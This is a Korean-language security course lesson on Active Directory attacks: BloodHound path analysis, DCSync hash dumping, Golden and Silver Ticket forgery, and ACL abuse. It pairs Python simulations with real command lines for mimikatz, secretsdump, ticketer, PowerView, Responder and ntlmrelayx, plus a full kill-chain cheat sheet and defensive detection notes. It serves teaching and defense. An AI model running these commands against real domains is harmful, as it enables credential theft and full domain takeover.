# Week 09: Active Directory 공격 — BloodHound, DCSync, Golden/Silver Ticket

## 학습 목표
- **Active Directory(AD)**의 아키텍처와 핵심 구성 요소를 심층 이해한다
- **BloodHound**를 사용하여 AD 환경의 공격 경로를 자동으로 분석할 수 있다
- **DCSync** 공격으로 도메인 컨트롤러에서 전체 해시를 복제할 수 있다
- **Golden Ticket**과 **Silver Ticket** 위조의 원리를 이해하고 구현할 수 있다
- **ACL 악용**(WriteDACL, GenericAll 등)을 통한 권한 상승 경로를 설명할 수 있다
- AD 공격의 탐지 기법과 방어 전략을 수립할 수 있다
- MITRE ATT&CK의 AD 관련 기법을 매핑할 수 있다

## 전제 조건
- Kerberos 인증 프로토콜(Week 05)을 이해하고 있어야 한다
- NTLM 해시와 Pass-the-Hash(Week 08)를 알고 있어야 한다
- LDAP 프로토콜의 기본 개념을 이해하고 있어야 한다
- Windows 도메인 환경의 기본 구조(DC, OU, GPO)를 알고 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 실습 기지 (공격 출발점) | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 모니터링 | `sshpass -p1 ssh siem@10.20.30.100` |

> **참고**: 실습 환경에 Windows AD가 없으므로 시뮬레이션과 원리 학습 위주로 진행한다.

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | AD 아키텍처 + BloodHound 이론 | 강의 |
| 0:40-1:10 | BloodHound 분석 실습 (시뮬레이션) | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:55 | DCSync + 크레덴셜 덤프 실습 | 실습 |
| 1:55-2:30 | Golden/Silver Ticket 실습 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | ACL 악용 + AD 방어 실습 | 실습 |
| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |

---

# Part 1: Active Directory 아키텍처와 BloodHound (40분)

## 1.1 Active Directory 핵심 구성 요소

| 구성 요소 | 약어 | 역할 |
|----------|------|------|
| **Domain Controller** | DC | Kerberos KDC, LDAP, DNS, 정책 배포 |
| **NTDS.dit** | - | AD 데이터베이스 (모든 계정/해시 저장) |
| **SYSVOL** | - | 그룹 정책, 로그인 스크립트 공유 |
| **Global Catalog** | GC | 포리스트 전체 검색용 읽기 전용 복제본 |
| **Organizational Unit** | OU | 개체 그룹화 + GPO 적용 단위 |
| **Group Policy Object** | GPO | 정책 설정 (보안, 소프트웨어, 스크립트) |
| **Trust Relationship** | - | 도메인/포리스트 간 인증 신뢰 |
| **KRBTGT** | - | Kerberos TGT 암호화 계정 |

```
[AD 포리스트 구조]
                    corp.local (루트 도메인)
                    /                      \
        dev.corp.local              hr.corp.local
        /           \                    /
    DC01          DC02               DC03
    (PDC)       (Backup)           (HR DC)
```

## 1.2 BloodHound — AD 공격 경로 분석

BloodHound는 AD 환경의 관계(그룹 멤버십, 세션, ACL 등)를 수집하고 **그래프 이론으로 공격 경로를 자동 분석**하는 도구이다.

### BloodHound 구성

| 구성 요소 | 역할 |
|----------|------|
| **SharpHound** (.NET) | AD 데이터 수집기 (Ingestor) |
| **BloodHound.py** (Python) | 원격 데이터 수집 |
| **Neo4j** | 그래프 데이터베이스 |
| **BloodHound GUI** | 그래프 시각화 + 쿼리 |

### BloodHound가 수집하는 정보

| 정보 | 수집 방법 | 공격 활용 |
|------|----------|----------|
| 그룹 멤버십 | LDAP | 중첩 그룹으로 관리자 경로 발견 |
| 로컬 관리자 | SAM-R | 해당 호스트 장악 가능 |
| 활성 세션 | NetSessionEnum | 크레덴셜 탈취 대상 |
| ACL/DACL | LDAP | WriteDACL, GenericAll 악용 |
| Trust 관계 | LDAP | 도메인 간 이동 경로 |
| GPO 링크 | LDAP | GPO 악용 경로 |
| 인증서 템플릿 | LDAP | ESC1~ESC8 공격 |

### BloodHound 핵심 쿼리

```cypher
// Domain Admin까지의 최단 경로
MATCH p=shortestPath((u:User {name:"john@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

// Kerberoastable 사용자
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

// DCSync 가능한 사용자
MATCH (u)-[:GetChanges|GetChangesAll]->(d:Domain) RETURN u.name
```

## 실습 1.1: BloodHound 분석 시뮬레이션

> **실습 목적**: BloodHound의 그래프 분석 원리를 시뮬레이션하여 AD 공격 경로 발견 기법을 이해한다
>
> **배우는 것**: AD 관계 그래프에서 공격 경로를 찾는 알고리즘과 주요 관계 유형을 배운다
>
> **결과 해석**: 일반 사용자에서 Domain Admin까지의 경로가 발견되면 권한 상승 가능이다
>
> **실전 활용**: AD 모의해킹에서 가장 먼저 실행하여 공격 전략을 수립하는 데 활용한다
>
> **명령어 해설**: Python으로 AD 관계 그래프를 시뮬레이션하고 최단 경로를 탐색한다
>
> **트러블슈팅**: AD 환경이 없으면 시뮬레이션으로 원리를 학습한다

```bash
python3 << 'PYEOF'
print("=== BloodHound AD 공격 경로 시뮬레이션 ===")
print()

# AD 관계 그래프 시뮬레이션
graph = {
    "john@CORP.LOCAL": {
        "type": "User",
        "memberOf": ["IT-Support@CORP.LOCAL"],
        "hasSession": ["WS01.CORP.LOCAL"],
    },
    "IT-Support@CORP.LOCAL": {
        "type": "Group",
        "adminTo": ["FILE01.CORP.LOCAL"],
        "memberOf": ["Remote-Desktop-Users@CORP.LOCAL"],
    },
    "FILE01.CORP.LOCAL": {
        "type": "Computer",
        "sessions": ["svc_backup@CORP.LOCAL"],
    },
    "svc_backup@CORP.LOCAL": {
        "type": "User",
        "memberOf": ["Backup-Operators@CORP.LOCAL"],
        "hasSPN": True,
    },
    "Backup-Operators@CORP.LOCAL": {
        "type": "Group",
        "genericAll": ["DC01.CORP.LOCAL"],
    },
    "DC01.CORP.LOCAL": {
        "type": "Computer",
        "sessions": ["Administrator@CORP.LOCAL"],
    },
    "Administrator@CORP.LOCAL": {
        "type": "User",
        "memberOf": ["Domain Admins@CORP.LOCAL"],
    },
}

# 공격 경로 출력
print("[BloodHound 분석 결과]")
print("john@CORP.LOCAL → Domain Admins 공격 경로:")
print()
print("  1. john@CORP.LOCAL")
print("     ↓ (MemberOf)")
print("  2. IT-Support@CORP.LOCAL")
print("     ↓ (AdminTo)")
print("  3. FILE01.CORP.LOCAL")
print("     ↓ (HasSession)")
print("  4. svc_backup@CORP.LOCAL  [Kerberoastable!]")
print("     ↓ (MemberOf)")
print("  5. Backup-Operators@CORP.LOCAL")
print("     ↓ (GenericAll)")
print("  6. DC01.CORP.LOCAL")
print("     ↓ (HasSession)")
print("  7. Administrator@CORP.LOCAL")
print("     ↓ (MemberOf)")
print("  8. Domain Admins@CORP.LOCAL  [목표 달성!]")
print()
print("=== 공격 계획 ===")
print("  Step 1: IT-Support 그룹 권한으로 FILE01에 접근")
print("  Step 2: FILE01에서 svc_backup 세션의 크레덴셜 탈취")
print("  Step 3: svc_backup은 SPN 보유 → Kerberoasting으로 비밀번호 크래킹")
print("  Step 4: Backup-Operators의 GenericAll로 DC01 장악")
print("  Step 5: DC01에서 Administrator 세션 → Domain Admin!")
PYEOF
```

---

# Part 2: DCSync 공격 (35분)

## 2.1 DCSync 원리

DCSync는 도메인 복제 프로토콜(MS-DRSR)을 악용하여 **DC인 것처럼 위장**하고 NTDS.dit의 해시를 원격으로 복제하는 공격이다.

```
[정상 DC 복제]
DC01 → DC02: "내 데이터 변경사항 줘" (GetNCChanges)
DC02 → DC01: 변경된 계정 해시 전송

[DCSync 공격]
공격자 → DC: "내 데이터 변경사항 줘" (GetNCChanges 위장)
DC → 공격자: krbtgt, Administrator 등 모든 해시 전송!
```

### DCSync 필요 권한

| 권한 | LDAP 속성 | 설명 |
|------|----------|------|
| **Replicating Directory Changes** | DS-Replication-Get-Changes | 기본 복제 |
| **Replicating Directory Changes All** | DS-Replication-Get-Changes-All | 비밀 포함 복제 |

기본적으로 Domain Admins, Enterprise Admins, Domain Controllers 그룹이 이 권한을 보유한다.

## 실습 2.1: DCSync 시뮬레이션

> **실습 목적**: DCSync 공격의 전체 과정을 시뮬레이션하여 원리와 위험성을 이해한다
>
> **배우는 것**: Impacket secretsdump의 DCSync 모드, 추출 가능한 데이터, 방어 방법을 배운다
>
> **결과 해석**: krbtgt, Administrator 등의 NTLM 해시가 추출되면 DCSync 성공이다
>
> **실전 활용**: AD 환경에서 Golden Ticket 생성의 전제인 krbtgt 해시를 획득하는 데 활용한다
>
> **명령어 해설**: secretsdump.py -just-dc는 DC에서 해시만 추출하는 DCSync 전용 모드이다
>
> **트러블슈팅**: 복제 권한이 없으면 먼저 WriteDACL을 이용하여 권한을 부여한다

```bash
# DCSync 시뮬레이션
echo "=== DCSync 공격 시뮬레이션 ==="
echo ""
echo "[1] DCSync 실행 (Impacket secretsdump)"
echo "  명령: secretsdump.py -just-dc corp.local/admin:P@ss@DC01"
echo "  또는: secretsdump.py -just-dc -hashes :NTLM corp.local/admin@DC01"
echo ""

python3 << 'PYEOF'
import hashlib
import os

print("[2] DCSync 결과 (시뮬레이션)")
print()

# 시뮬레이션 해시 데이터
accounts = [
    ("Administrator", "500", "P@ssw0rd2025!"),
    ("krbtgt", "502", "RandomKrbtgtPassword123!"),
    ("svc_mssql", "1103", "Summer2025!"),
    ("svc_backup", "1104", "Backup#2025"),
    ("john.smith", "1105", "Welcome123"),
    ("jane.doe", "1106", "Password1!"),
    ("DA-admin", "1107", "C0mpl3x!Pass"),
]

print("  [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)")
print()
for name, rid, pwd in accounts:
    ntlm = hashlib.new('md4', pwd.encode('utf-16-le')).hexdigest()
    lm = "aad3b435b51404eeaad3b435b51404ee"  # 빈 LM 해시
    print(f"  CORP\\{name}:{rid}:{lm}:{ntlm}:::")

print()
print("[3] 핵심 해시")
krbtgt_hash = hashlib.new('md4', "RandomKrbtgtPassword123!".encode('utf-16-le')).hexdigest()
admin_hash = hashlib.new('md4', "P@ssw0rd2025!".encode('utf-16-le')).hexdigest()
print(f"  krbtgt NTLM: {krbtgt_hash}")
print(f"  Administrator NTLM: {admin_hash}")
print(f"  → krbtgt 해시로 Golden Ticket 생성 가능!")
print(f"  → Administrator 해시로 Pass-the-Hash 가능!")

print()
print("[4] DCSync 탐지")
print("  Event ID 4662: Directory Service Access")
print("  속성: 1131f6ad-... (GetChanges), 1131f6aa-... (GetChangesAll)")
print("  DC가 아닌 호스트에서 이 이벤트 발생 시 DCSync 의심")
PYEOF
```

---

# Part 3: Golden Ticket과 Silver Ticket (35분)

## 3.1 Golden Ticket

Golden Ticket은 **krbtgt 해시로 TGT를 위조**하는 공격이다. 유효한 TGT를 가지면 도메인 내 모든 서비스에 접근할 수 있다.

```
[Golden Ticket 생성]
필요 정보:
  1. krbtgt NTLM 해시 (DCSync로 획득)
  2. Domain SID (whoami /all)
  3. Domain 이름

결과:
  위조된 TGT → 임의의 사용자 이름, 임의의 그룹 (Domain Admin 포함)
  → 도메인 내 모든 서비스에 접근 가능
  → 기본 유효기간: 10년!
```

### Golden Ticket vs Silver Ticket

| 항목 | Golden Ticket | Silver Ticket |
|------|-------------|--------------|
| 위조 대상 | TGT | Service Ticket (TGS) |
| 필요 해시 | krbtgt | 서비스 계정 |
| 접근 범위 | 도메인 전체 | 특정 서비스만 |
| KDC 접촉 | 필요 (TGS 요청) | 불필요! |
| 탐지 난이도 | 중간 | 높음 (KDC 로그 없음) |
| ATT&CK | T1558.001 | T1558.002 |

## 실습 3.1: Golden Ticket 생성 시뮬레이션

> **실습 목적**: Golden Ticket의 생성 과정과 도메인 전체 장악 방법을 시뮬레이션한다
>
> **배우는 것**: Mimikatz/Impacket을 이용한 Golden Ticket 생성과 사용 방법을 배운다
>
> **결과 해석**: 위조된 TGT로 DC에 접근할 수 있으면 Golden Ticket 공격 성공이다
>
> **실전 활용**: AD 도메인의 완전한 장악 + 지속적 접근 확보(Persistence)에 활용한다
>
> **명령어 해설**: kerberos::golden은 Mimikatz의 Golden Ticket 생성 명령이다
>
> **트러블슈팅**: krbtgt 비밀번호가 변경되면 기존 Golden Ticket이 무효화된다

```bash
# Golden Ticket 시뮬레이션
python3 << 'PYEOF'
import hashlib
import base64
import os
import time

print("=== Golden Ticket 생성 시뮬레이션 ===")
print()

# 필요 정보
domain = "CORP.LOCAL"
domain_sid = "S-1-5-21-1234567890-987654321-1122334455"
krbtgt_hash = hashlib.new('md4', "RandomKrbtgtPassword123!".encode('utf-16-le')).hexdigest()

print(f"[필요 정보]")
print(f"  Domain: {domain}")
print(f"  Domain SID: {domain_sid}")
print(f"  krbtgt NTLM: {krbtgt_hash}")
print()

# Mimikatz 명령
print("[Golden Ticket 생성 — Mimikatz]")
print(f"  mimikatz# kerberos::golden /user:FakeAdmin /domain:{domain} \\")
print(f"    /sid:{domain_sid} /krbtgt:{krbtgt_hash} /ptt")
print()

# Impacket 명령
print("[Golden Ticket 생성 — Impacket]")
print(f"  ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} \\")
print(f"    -domain {domain} FakeAdmin")
print(f"  export KRB5CCNAME=FakeAdmin.ccache")
print(f"  psexec.py -k -no-pass {domain}/FakeAdmin@DC01.{domain}")
print()

# 위조된 티켓 내용
print("[위조된 TGT 내용]")
fake_tgt = {
    "사용자": "FakeAdmin (실제로 존재하지 않아도 됨!)",
    "그룹": ["Domain Admins (RID 512)", "Enterprise Admins (RID 519)",
             "Schema Admins (RID 518)"],
    "유효기간": "10년 (기본값)",
    "암호화": f"krbtgt 해시로 RC4/AES 암호화",
    "PAC": "Domain Admin 권한 포함",
}
for k, v in fake_tgt.items():
    if isinstance(v, list):
        print(f"  {k}:")
        for item in v:
            print(f"    - {item}")
    else:
        print(f"  {k}: {v}")

print()
print("=== Golden Ticket 방어 ===")
print("1. krbtgt 비밀번호 주기적 변경 (2회 연속 변경!)")
print("2. Privileged Access Workstation(PAW) 사용")
print("3. Event ID 4769에서 비정상 TGS 요청 모니터링")
print("4. AES-only Kerberos 강제 (RC4 비활성)")
print("5. 장기간 유효한 TGT 탐지")
PYEOF
```

## 실습 3.2: Silver Ticket 시뮬레이션

> **실습 목적**: Silver Ticket의 생성과 특정 서비스 접근 방법을 시뮬레이션한다
>
> **배우는 것**: 서비스 계정 해시로 Service Ticket을 위조하여 KDC 없이 서비스에 접근하는 방법을 배운다
>
> **결과 해석**: 위조된 ST로 특정 서비스에 접근하면 Silver Ticket 공격 성공이다
>
> **실전 활용**: 특정 서비스(MSSQL, Exchange 등)에 은밀하게 접근하는 데 활용한다
>
> **명령어 해설**: kerberos::golden에 /service 옵션을 추가하면 Silver Ticket이 된다
>
> **트러블슈팅**: PAC 검증이 활성화되면 Silver Ticket이 거부될 수 있다

```bash
# Silver Ticket 시뮬레이션
echo "=== Silver Ticket 시뮬레이션 ==="
echo ""

python3 << 'PYEOF'
import hashlib

domain = "CORP.LOCAL"
domain_sid = "S-1-5-21-1234567890-987654321-1122334455"

# 서비스 계정 해시 (Kerberoasting으로 획득)
services = {
    "CIFS (파일 공유)": {
        "spn": "CIFS/FILE01.CORP.LOCAL",
        "account": "FILE01$",
        "hash": hashlib.new('md4', "ComputerPass123!".encode('utf-16-le')).hexdigest(),
        "용도": "SMB/파일 공유 접근",
    },
    "HTTP (웹 서비스)": {
        "spn": "HTTP/WEB01.CORP.LOCAL",
        "account": "svc_http",
        "hash": hashlib.new('md4', "HttpSvc2025!".encode('utf-16-le')).hexdigest(),
        "용도": "웹 애플리케이션 접근",
    },
    "MSSQLSvc (데이터베이스)": {
        "spn": "MSSQLSvc/DB01.CORP.LOCAL:1433",
        "account": "svc_mssql",
        "hash": hashlib.new('md4', "Summer2025!".encode('utf-16-le')).hexdigest(),
        "용도": "SQL Server 접근",
    },
}

for name, info in services.items():
    print(f"[Silver Ticket: {name}]")
    print(f"  SPN: {info['spn']}")
    print(f"  계정: {info['account']}")
    print(f"  NTLM: {info['hash']}")
    print(f"  용도: {info['용도']}")
    print(f"  Mimikatz: kerberos::golden /user:FakeAdmin /domain:{domain} \\")
    print(f"    /sid:{domain_sid} /target:{info['spn'].split('/')[1]} \\")
    print(f"    /service:{info['spn'].split('/')[0]} /rc4:{info['hash']} /ptt")
    print()

print("=== Silver Ticket 특징 ===")
print("1. KDC에 접촉하지 않음 → DC 이벤트 로그에 기록 안 됨!")
print("2. 서비스 계정 해시만 있으면 생성 가능")
print("3. Golden Ticket보다 탐지가 어려움")
print("4. 단, 해당 서비스에만 접근 가능 (범위 제한)")
PYEOF
```

---

# Part 4: ACL 악용과 AD 방어 (35분)

## 4.1 AD ACL 악용

AD 객체에 설정된 **ACL(Access Control List)**에 과도한 권한이 부여되면 권한 상승에 악용될 수 있다.

| ACL 권한 | 악용 방법 | 결과 |
|---------|----------|------|
| **GenericAll** | 비밀번호 리셋, 멤버 추가 | 계정 장악 |
| **GenericWrite** | SPN 추가 (Targeted Kerberoasting) | 해시 크래킹 |
| **WriteDACL** | 자신에게 DCSync 권한 부여 | 전체 해시 |
| **WriteOwner** | 소유자 변경 → WriteDACL 획득 | 연쇄 상승 |
| **ForceChangePassword** | 비밀번호 강제 변경 | 계정 장악 |
| **AddMember** | 그룹에 자신 추가 | 권한 획득 |

## 실습 4.1: ACL 악용 시뮬레이션

> **실습 목적**: AD ACL의 과도한 권한 설정을 악용하여 권한 상승하는 경로를 시뮬레이션한다
>
> **배우는 것**: GenericAll, WriteDACL 등 ACL 권한의 악용 방법과 BloodHound에서의 표시를 배운다
>
> **결과 해석**: ACL 체인을 통해 Domain Admin에 도달하면 권한 상승 성공이다
>
> **실전 활용**: BloodHound에서 ACL 기반 공격 경로를 발견하고 실행하는 데 활용한다
>
> **명령어 해설**: PowerView의 Set-DomainObject, Add-DomainGroupMember 등으로 ACL을 악용한다
>
> **트러블슈팅**: ACL 변경 시 감사 로그(Event 4662, 5136)가 생성되므로 주의한다

```bash
python3 << 'PYEOF'
print("=== AD ACL 악용 시뮬레이션 ===")
print()

# ACL 기반 공격 체인
chain = [
    {
        "단계": 1,
        "현재": "john@CORP.LOCAL (일반 사용자)",
        "권한": "GenericWrite on svc_backup",
        "행위": "svc_backup에 SPN 추가 (Targeted Kerberoasting)",
        "명령": "Set-DomainObject -Identity svc_backup -Set @{serviceprincipalname='HTTP/fake'}",
    },
    {
        "단계": 2,
        "현재": "john@CORP.LOCAL",
        "권한": "Kerberoasting svc_backup",
        "행위": "서비스 티켓 요청 후 오프라인 크래킹",
        "명령": "GetUserSPNs.py corp.local/john -request -outputfile tgs.hash",
    },
    {
        "단계": 3,
        "현재": "svc_backup@CORP.LOCAL",
        "권한": "WriteDACL on Domain",
        "행위": "자신에게 DCSync 권한 부여",
        "명령": "Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity svc_backup -Rights DCSync",
    },
    {
        "단계": 4,
        "현재": "svc_backup@CORP.LOCAL (DCSync 권한)",
        "권한": "DCSync",
        "행위": "krbtgt + Administrator 해시 추출",
        "명령": "secretsdump.py corp.local/svc_backup@DC01 -just-dc",
    },
    {
        "단계": 5,
        "현재": "krbtgt 해시 보유",
        "권한": "Golden Ticket",
        "행위": "Domain Admin TGT 위조",
        "명령": "ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain corp.local FakeAdmin",
    },
]

for step in chain:
    print(f"[Step {step['단계']}] {step['현재']}")
    print(f"  ACL 권한: {step['권한']}")
    print(f"  행위: {step['행위']}")
    print(f"  명령: {step['명령']}")
    print()

print("=== ACL 악용 방어 ===")
print("1. AdminSDHolder 보호 + SDProp 모니터링")
print("2. 최소 권한 원칙 (ACL 정기 감사)")
print("3. BloodHound로 위험한 ACL 사전 발견")
print("4. Event ID 5136 (Directory Object Modified) 모니터링")
print("5. Tier 0/1/2 분리 (Administrative Tier Model)")
PYEOF
```

## 실습 4.2: AD 공격 종합 킬체인

> **실습 목적**: AD 환경에서의 전체 공격 킬체인을 순서대로 매핑하고 실행 계획을 수립한다
>
> **배우는 것**: 초기 접근 → BloodHound → 크레덴셜 수집 → 측면 이동 → Domain Admin의 전체 흐름을 배운다
>
> **결과 해석**: 킬체인의 각 단계를 구체적 도구와 명령으로 매핑할 수 있으면 성공이다
>
> **실전 활용**: AD 모의해킹의 전체 공격 계획 수립에 직접 활용한다
>
> **명령어 해설**: 각 단계별 도구와 명령을 정리한 종합 치트시트이다
>
> **트러블슈팅**: 각 단계의 전제 조건이 충족되지 않으면 이전 단계로 돌아간다

```bash
echo "============================================================"
echo "       AD 공격 종합 킬체인                                    "
echo "============================================================"

cat << 'KILLCHAIN'

Phase 1: 정찰
  도구: BloodHound (SharpHound), PowerView, ldapsearch
  목표: 도메인 구조, 그룹 관계, ACL, SPN 파악
  명령: SharpHound.exe -c All
        bloodhound-python -u john -p pass -d corp.local -c all

Phase 2: 초기 크레덴셜 획득
  도구: Responder, mitm6, ntlmrelayx
  목표: NTLM 해시 또는 평문 비밀번호
  명령: responder -I eth0 -dwP
        ntlmrelayx.py -tf targets.txt -smb2support

Phase 3: Kerberoasting / AS-REP Roasting
  도구: Impacket, Rubeus, hashcat
  목표: 서비스 계정 비밀번호
  명령: GetUserSPNs.py corp.local/john -request
        hashcat -m 13100 tgs.hash rockyou.txt

Phase 4: 측면 이동
  도구: CrackMapExec, PSExec, WMIExec
  목표: 추가 호스트 장악, 크레덴셜 수집
  명령: cme smb 10.0.0.0/24 -u admin -H HASH
        wmiexec.py -hashes :HASH admin@target

Phase 5: 권한 상승 (ACL 악용)
  도구: PowerView, BloodyAD
  목표: DCSync 권한 획득
  명령: Set-DomainObject, Add-DomainObjectAcl

Phase 6: DCSync
  도구: Impacket secretsdump, Mimikatz
  목표: krbtgt + 전체 해시
  명령: secretsdump.py -just-dc admin@DC01

Phase 7: 지속성 (Golden Ticket)
  도구: Mimikatz, Impacket ticketer
  목표: 장기간 Domain Admin 접근
  명령: ticketer.py -nthash KRBTGT admin

KILLCHAIN
```

---

## 검증 체크리스트

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | AD 구조 이해 | 구두 설명 | DC, OU, GPO 설명 |
| 2 | BloodHound 원리 | 경로 분석 | 공격 경로 발견 |
| 3 | DCSync 원리 | 시뮬레이션 | 해시 추출 과정 설명 |
| 4 | Golden Ticket | 생성 과정 | krbtgt→TGT 위조 |
| 5 | Silver Ticket | 생성 과정 | 서비스해시→ST 위조 |
| 6 | ACL 악용 | 체인 구성 | 5단계 체인 설명 |
| 7 | 탐지 이벤트 | ID 제시 | 4662, 4769, 5136 |
| 8 | Kerberoasting | 시뮬레이션 | 해시 추출+크래킹 |
| 9 | 킬체인 매핑 | 전체 계획 | 7 Phase 완료 |
| 10 | 방어 전략 | 5가지 이상 | 구체적 대책 제시 |

---

## 자가 점검 퀴즈

**Q1.** DCSync 공격에 필요한 AD 권한 2가지는?

<details><summary>정답</summary>
1. DS-Replication-Get-Changes (Replicating Directory Changes)
2. DS-Replication-Get-Changes-All (Replicating Directory Changes All)
이 두 권한이 있으면 도메인 복제 프로토콜(MS-DRSR)을 사용하여 DC의 NTDS.dit에서 모든 해시를 원격으로 복제할 수 있다.
</details>

**Q2.** Golden Ticket이 Silver Ticket보다 범위가 넓은 이유는?

<details><summary>정답</summary>
Golden Ticket은 krbtgt 해시로 TGT를 위조하므로 KDC에 TGS를 요청하여 도메인 내 모든 서비스에 접근 가능하다. Silver Ticket은 특정 서비스 계정 해시로 ST만 위조하므로 해당 서비스에만 접근 가능하다. 반면 Silver Ticket은 KDC를 거치지 않아 탐지가 더 어렵다.
</details>

**Q3.** BloodHound에서 GenericAll 관계가 위험한 이유는?

<details><summary>정답</summary>
GenericAll은 대상 객체에 대한 완전한 제어 권한이다. 사용자에 대해서는 비밀번호 리셋, SPN 추가, 멤버십 변경이 가능하고, 컴퓨터에 대해서는 RBCD(Resource-Based Constrained Delegation) 설정이 가능하며, 그룹에 대해서는 자신을 멤버로 추가할 수 있다.
</details>

**Q4.** krbtgt 비밀번호를 변경할 때 2번 연속 변경해야 하는 이유는?

<details><summary>정답</summary>
Kerberos는 현재 krbtgt 해시와 이전 krbtgt 해시(n-1) 모두로 발급된 TGT를 유효하게 처리한다. 따라서 1번만 변경하면 이전 해시로 만든 Golden Ticket이 여전히 유효하다. 2번 변경하면 이전-이전 해시가 무효화되어 모든 Golden Ticket이 무력화된다.
</details>

**Q5.** Silver Ticket이 Golden Ticket보다 탐지가 어려운 이유는?

<details><summary>정답</summary>
Silver Ticket은 KDC에 접촉하지 않고 직접 서비스에 ST를 제시한다. 따라서 DC의 이벤트 로그(Event 4769 TGS 요청)에 기록이 남지 않는다. Golden Ticket은 TGS를 요청하므로 DC에 기록이 남는다. Silver Ticket 탐지는 대상 서비스의 로컬 로그에 의존해야 한다.
</details>

**Q6.** WriteDACL 권한으로 DCSync를 수행하는 과정을 설명하라.

<details><summary>정답</summary>
1. WriteDACL 권한으로 도메인 객체의 ACL을 수정
2. 자신의 계정에 DS-Replication-Get-Changes + Get-Changes-All 권한을 추가
3. 추가된 복제 권한으로 secretsdump.py -just-dc 실행
4. krbtgt 및 전체 도메인 해시 복제
5. (선택) ACL 변경 흔적 제거
</details>

**Q7.** SharpHound가 수집하는 6가지 정보 유형은?

<details><summary>정답</summary>
1. 그룹 멤버십 (Group Membership)
2. 로컬 관리자 (Local Admin)
3. 활성 세션 (Sessions)
4. ACL/DACL (Object Control)
5. Trust 관계 (Domain Trusts)
6. 인증서 템플릿 (Certificate Templates)
</details>

**Q8.** Targeted Kerberoasting이란?

<details><summary>정답</summary>
일반 Kerberoasting은 이미 SPN이 등록된 계정만 대상이지만, Targeted Kerberoasting은 GenericWrite/GenericAll 권한을 이용하여 대상 계정에 SPN을 추가한 후 Kerberoasting을 수행한다. 이를 통해 SPN이 없던 고권한 계정도 공격할 수 있다.
</details>

**Q9.** AD Tier Model(0/1/2)의 구조와 목적은?

<details><summary>정답</summary>
Tier 0: 도메인 컨트롤러, 인증 인프라 (최고 보안)
Tier 1: 서버, 애플리케이션 (중간 보안)
Tier 2: 워크스테이션, 사용자 (일반 보안)
목적: 상위 Tier의 크레덴셜이 하위 Tier에서 노출되지 않도록 분리. Tier 0 관리자는 Tier 0 장비에서만 로그인하여 크레덴셜 탈취를 방지한다.
</details>

**Q10.** 실습 환경에 AD가 있다면 가장 효과적인 공격 경로는?

<details><summary>정답</summary>
1. web 서버 침투 → 도메인 사용자 크레덴셜 획득
2. BloodHound로 공격 경로 분석
3. Kerberoasting으로 서비스 계정 비밀번호 크래킹
4. 서비스 계정의 ACL 권한(GenericAll/WriteDACL) 확인
5. DCSync 권한 획득 → krbtgt 해시 추출
6. Golden Ticket 생성 → Domain Admin 장악
</details>

---

## 과제

### 과제 1: AD 공격 치트시트 (개인)
이번 주 학습한 모든 AD 공격 기법(BloodHound, DCSync, Golden/Silver Ticket, ACL 악용)의 치트시트를 작성하라. 도구, 명령, 전제 조건, 탐지 이벤트를 포함할 것.

### 과제 2: AD 방어 아키텍처 설계 (팀)
가상의 AD 환경(500명 규모)에 대한 방어 아키텍처를 설계하라. Tier Model, Privileged Access, 모니터링, krbtgt 관리 정책을 포함할 것.

### 과제 3: BloodHound 쿼리 10선 (팀)
AD 공격 경로를 발견하기 위한 Cypher 쿼리 10개를 작성하라. 각 쿼리의 목적, 예상 결과, 공격 활용 방법을 설명할 것.
